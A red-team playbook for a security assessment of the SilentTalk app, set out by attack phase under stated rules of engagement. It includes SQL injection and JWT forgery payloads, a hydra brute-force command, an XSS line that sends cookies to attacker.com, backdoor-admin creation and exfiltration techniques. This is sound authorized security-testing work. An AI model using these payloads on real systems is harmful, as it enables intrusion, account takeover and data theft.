# Red Team Playbook
**SilentTalk FYP - NFR-004 Security Assessment**

## Mission Objectives

Simulate realistic attacks to identify and exploit vulnerabilities in the SilentTalk application before malicious actors do.

**Classification:** CONFIDENTIAL
**Last Updated:** 2025-11-13
**Approved By:** Security Team Lead

---

## Table of Contents

1. [Pre-Engagement](#pre-engagement)
2. [Reconnaissance](#reconnaissance)
3. [Initial Access](#initial-access)
4. [Persistence](#persistence)
5. [Privilege Escalation](#privilege-escalation)
6. [Defense Evasion](#defense-evasion)
7. [Credential Access](#credential-access)
8. [Lateral Movement](#lateral-movement)
9. [Data Exfiltration](#data-exfiltration)
10. [Impact](#impact)
11. [Reporting](#reporting)

---

## Pre-Engagement

### 1. Rules of Engagement

**Authorized Actions:**
- ✅ Test staging/test environments
- ✅ Create test accounts
- ✅ Attempt to bypass authentication
- ✅ Test for injection vulnerabilities
- ✅ Attempt privilege escalation
- ✅ Test data access controls

**Prohibited Actions:**
- ❌ Test production systems without explicit approval
- ❌ Perform DoS attacks on production
- ❌ Delete or modify production data
- ❌ Access real user data
- ❌ Test during business-critical hours (without approval)
- ❌ Share findings before reporting

### 2. Setup & Tools

**Required Tools:**
```bash
# Install testing tools
brew install nmap
brew install burpsuite
brew install sqlmap
brew install nikto
npm install -g retire

# Clone testing repos
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
git clone https://github.com/danielmiessler/SecLists
```

**Test Accounts:**
- `redteam-user@test.com` (Regular User)
- `redteam-admin@test.com` (Admin User)
- `redteam-mod@test.com` (Moderator)

### 3. Communication

- **Primary Channel:** Slack #security-redteam
- **Emergency Contact:** security@silenttalk.com
- **Daily Standup:** 10:00 AM UTC
- **Incident Reporting:** Immediate via phone + email

---

## Reconnaissance

### Phase 1: OSINT (Open-Source Intelligence)

**Objective:** Gather publicly available information

**Tasks:**

1. **Domain Enumeration**
   ```bash
   # Find subdomains
   amass enum -d silenttalk.com

   # Check DNS records
   dig silenttalk.com ANY
   host -a silenttalk.com

   # Find related domains
   whois silenttalk.com
   ```

2. **Technology Fingerprinting**
   ```bash
   # Identify web technologies
   whatweb https://app.silenttalk.com
   wappalyzer https://app.silenttalk.com

   # Check for exposed services
   nmap -sV -p- app.silenttalk.com
   ```

3. **Public Code Repositories**
   - [ ] Search GitHub for "silenttalk" repositories
   - [ ] Look for leaked credentials in commit history
   - [ ] Find API keys in source code
   - [ ] Identify dependencies and versions

4. **Employee Information**
   - [ ] LinkedIn profiles (potential social engineering targets)
   - [ ] Email address formats
   - [ ] Organizational structure

5. **Metadata Collection**
   ```bash
   # Extract metadata from documents
   exiftool downloaded-doc.pdf

   # Search for exposed files
   site:silenttalk.com filetype:pdf
   site:silenttalk.com filetype:xlsx
   ```

**Success Criteria:**
- Comprehensive list of domains and subdomains
- Technology stack identified
- Potential entry points documented
- Employee directory created

---

## Initial Access

### Phase 2: Gaining Foothold

**Objective:** Establish initial access to the application

#### Attack Vector 1: Authentication Bypass

**Scenario:** Bypass login using SQL injection

**Steps:**
1. Intercept login request with Burp Suite
2. Try SQL injection payloads:
   ```
   email: ' OR '1'='1' --
   password: anything
   ```
3. If unsuccessful, try:
   ```
   email: admin'--
   password: [empty]
   ```
4. Document response codes and error messages

**Expected Defense:** Input validation, parameterized queries
**Success:** Authentication bypass → Access token obtained

#### Attack Vector 2: Weak Password Brute Force

**Scenario:** Crack weak user passwords

**Steps:**
```bash
# Create wordlist
cat /usr/share/wordlists/rockyou.txt | head -1000 > passwords.txt

# Brute force with hydra
hydra -l redteam-user@test.com -P passwords.txt \
  https-post-form \
  "/api/auth/login:email=^USER^&password=^PASS^:F=Invalid credentials"
```

**Expected Defense:** Account lockout, CAPTCHA, rate limiting
**Success:** Valid credentials obtained

#### Attack Vector 3: Session Token Theft

**Scenario:** Steal session tokens via XSS

**Steps:**
1. Find reflected XSS vulnerability in search
2. Inject payload:
   ```html
   <script>
   fetch('https://attacker.com/steal?cookie='+document.cookie)
   </script>
   ```
3. Share malicious link with victim
4. Capture session token

**Expected Defense:** CSP, HTTPOnly cookies, input sanitization
**Success:** Session hijacking achieved

#### Attack Vector 4: Password Reset Exploitation

**Scenario:** Take over account via password reset

**Steps:**
1. Request password reset for target account
2. Intercept reset email/token
3. Try:
   - Token brute force
   - Token reuse
   - Token manipulation
   - Host header injection to redirect email
4. Reset password

**Expected Defense:** Strong token generation, single-use tokens, expiration
**Success:** Account takeover

---

## Persistence

### Phase 3: Maintaining Access

**Objective:** Ensure continued access even after credentials change

#### Technique 1: Create Backdoor Account

**Steps:**
1. If admin access obtained, create new admin account:
   ```bash
   curl -X POST https://api.silenttalk.com/api/admin/users \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     -d '{"email":"backdoor@test.com","role":"admin"}'
   ```
2. Use non-obvious username
3. Set strong password (store securely)

**Cleanup:** Delete backdoor account after testing

#### Technique 2: Session Token Theft & Reuse

**Steps:**
1. Extract long-lived session tokens
2. Store tokens securely
3. Reuse tokens even after password changes

**Expected Defense:** Token rotation, short expiration, logout invalidation

---

## Privilege Escalation

### Phase 4: Elevating Privileges

**Objective:** Escalate from regular user to admin

#### Escalation Path 1: Modify User Role

**Steps:**
1. Intercept profile update request
2. Add `role` parameter:
   ```json
   {
     "firstName": "John",
     "lastName": "Doe",
     "role": "admin"
   }
   ```
3. Check if role updated

**Expected Defense:** Role field ignored in user input, authorization checks
**Success:** User role elevated to admin

#### Escalation Path 2: IDOR to Admin Functions

**Steps:**
1. Find admin endpoint: `/api/admin/users`
2. Try to access as regular user
3. Try ID manipulation:
   ```
   /api/users/1/promote  # Try different IDs
   /api/users/me/role?role=admin
   ```

**Expected Defense:** Authorization middleware, ownership validation
**Success:** Admin functions accessible

#### Escalation Path 3: JWT Token Manipulation

**Steps:**
1. Decode JWT token
2. Modify payload:
   ```json
   {
     "userId": "123",
     "role": "admin"  // Change from "user"
   }
   ```
3. Re-sign with:
   - `none` algorithm
   - Weak secret guessing
   - Key confusion attack
4. Use modified token

**Expected Defense:** Strong secret, algorithm validation, signature verification
**Success:** Admin access via forged token

---

## Defense Evasion

### Phase 5: Avoiding Detection

**Objective:** Evade security monitoring and controls

#### Technique 1: Rate Limit Bypass

**Steps:**
1. Use multiple IP addresses (VPN rotation)
2. Add X-Forwarded-For headers
3. Distribute requests over time
4. Use multiple user accounts

#### Technique 2: WAF Bypass

**Steps:**
1. Test different encoding:
   ```
   %3Cscript%3E  # URL encoding
   \u003cscript\u003e  # Unicode
   <scr<script>ipt>  # Nested
   ```
2. Use comment obfuscation
3. Try case variation

#### Technique 3: Log Evasion

**Steps:**
1. Use legitimate-looking payloads
2. Stay within normal usage patterns
3. Clear traces if possible

---

## Credential Access

### Phase 6: Harvesting Credentials

**Objective:** Obtain additional user credentials

#### Method 1: Database Extraction via SQLi

**Steps:**
```sql
' UNION SELECT username, password, email FROM users--
```

**Expected Defense:** Parameterized queries, ORM usage
**Success:** User credentials dumped

#### Method 2: Password Hash Cracking

**Steps:**
1. Extract password hashes
2. Identify hash type:
   ```bash
   hashid $HASH
   ```
3. Crack with hashcat:
   ```bash
   hashcat -m 3200 hashes.txt rockyou.txt
   ```

**Expected Defense:** Strong hashing (bcrypt, scrypt, Argon2), salt
**Success:** Plaintext passwords recovered

#### Method 3: Session Token Collection

**Steps:**
1. XSS to steal cookies
2. MITM to intercept tokens
3. Session fixation attacks

---

## Lateral Movement

### Phase 7: Expanding Access

**Objective:** Access additional accounts and resources

#### Technique 1: Horizontal Privilege Escalation

**Steps:**
1. Obtain User A's credentials
2. Access User B's data:
   ```
   GET /api/profile/USER_B_ID
   GET /api/messages/USER_B_ID
   ```

**Expected Defense:** Ownership validation
**Success:** Multiple user accounts compromised

#### Technique 2: API Key Harvesting

**Steps:**
1. Find API keys in:
   - Client-side source code
   - Local storage
   - Console logs
   - Network traffic
2. Use keys to access third-party services

---

## Data Exfiltration

### Phase 8: Extracting Data

**Objective:** Demonstrate data breach impact

**IMPORTANT:** Do NOT exfiltrate real user data. Use test data only.

#### Method 1: Bulk Data Export

**Steps:**
1. If admin access obtained:
   ```bash
   curl https://api.silenttalk.com/api/admin/users/export \
     -H "Authorization: Bearer $ADMIN_TOKEN" \
     > users.json
   ```
2. Document what data is accessible
3. Delete exported files immediately

#### Method 2: Slow Drip Exfiltration

**Steps:**
1. Query API endpoints systematically
2. Extract data in small chunks to avoid detection
3. Reconstruct full dataset

**Expected Defense:** Rate limiting, anomaly detection, data access logging

---

## Impact

### Phase 9: Demonstrating Impact

**Objective:** Show real-world consequences of vulnerabilities

**Allowed Impact Demonstrations:**

1. **Account Takeover**
   - Take over test account
   - Change password
   - Access private data

2. **Data Manipulation**
   - Modify test user profiles
   - Delete test forum posts
   - Cancel test bookings

3. **Service Disruption** (Test Environment Only)
   - Application-level DoS
   - Resource exhaustion
   - Logic bombs

**Prohibited:**
- Permanent data deletion
- Real user impact
- Production system disruption

---

## Reporting

### Phase 10: Documentation & Remediation

**Immediate Reporting (Critical Findings):**
- Authentication bypass
- SQL injection
- RCE vulnerabilities
- Sensitive data exposure

**Format:**
```markdown
## Critical Vulnerability: [Name]

**Severity:** Critical
**CVSS:** 9.8
**Impact:** Complete system compromise

### Description
[Detailed explanation]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]

### Proof of Concept
[Screenshots/video/code]

### Remediation
[Fix recommendations]

### Timeline
- Discovered: YYYY-MM-DD HH:MM
- Reported: YYYY-MM-DD HH:MM
- Fixed: [TBD]
```

**Final Report Sections:**
1. Executive Summary
2. Methodology
3. Scope
4. Findings Summary
5. Detailed Findings (by severity)
6. Attack Chain Diagram
7. Recommendations
8. Conclusion

---

## Attack Scenarios

### Scenario 1: Account Takeover Chain

**Objective:** Complete account takeover from external attacker perspective

**Steps:**
1. Reconnaissance → Find user emails from public sources
2. Initial Access → Exploit password reset vulnerability
3. Persistence → Create backdoor account
4. Privilege Escalation → Elevate to admin
5. Impact → Access all user data

**Success Criteria:** Admin access obtained from zero knowledge

### Scenario 2: Data Breach Simulation

**Objective:** Extract maximum amount of data

**Steps:**
1. Initial Access → SQL injection on search endpoint
2. Credential Access → Dump user password hashes
3. Lateral Movement → Crack passwords, access multiple accounts
4. Data Exfiltration → Export user data via admin API

**Success Criteria:** Test data successfully "exfiltrated"

### Scenario 3: Insider Threat

**Objective:** Malicious employee scenario

**Steps:**
1. Start with regular employee account
2. Privilege Escalation → Abuse trust to gain admin
3. Defense Evasion → Use legitimate credentials to avoid detection
4. Data Exfiltration → Slow drip data over time
5. Impact → Sabotage before departure

**Success Criteria:** Admin access from employee account, data extracted

---

## Cleanup Procedures

**After Testing:**

1. **Delete Test Accounts**
   ```bash
   # Remove backdoor accounts
   # Restore modified data
   # Clear test data
   ```

2. **Revoke Tokens**
   ```bash
   # Invalidate all test session tokens
   # Reset test account passwords
   ```

3. **Clear Logs** (in coordination with blue team)
   - Document which test activities to filter from alerts
   - Ensure real attacks not masked

4. **Restore State**
   - Revert any configuration changes
   - Restore deleted test data
   - Verify application functionality

---

## Success Metrics

- [ ] 10+ vulnerabilities identified
- [ ] At least 1 critical vulnerability found
- [ ] Complete attack chain demonstrated
- [ ] All findings documented with PoC
- [ ] Remediation recommendations provided
- [ ] Zero production impact
- [ ] All cleanup completed

---

## Lessons Learned

**Post-Engagement Debrief:**
1. What worked well?
2. What didn't work?
3. What would you do differently?
4. New techniques discovered?
5. Gaps in security testing?

**Continuous Improvement:**
- Update playbook with new techniques
- Add successful payloads to library
- Document defensive measures encountered
- Share knowledge with team

---

## Next Steps

1. **Immediate:** Report critical vulnerabilities
2. **Short-term:** Develop patches for high/critical findings
3. **Medium-term:** Implement additional security controls
4. **Long-term:** Schedule next red team engagement (6 months)

---

**Classification:** CONFIDENTIAL - Internal Use Only
**Distribution:** Security Team, Development Leads, CTO

**Acknowledgments:** Based on MITRE ATT&CK Framework, OWASP Testing Guide, and PTES
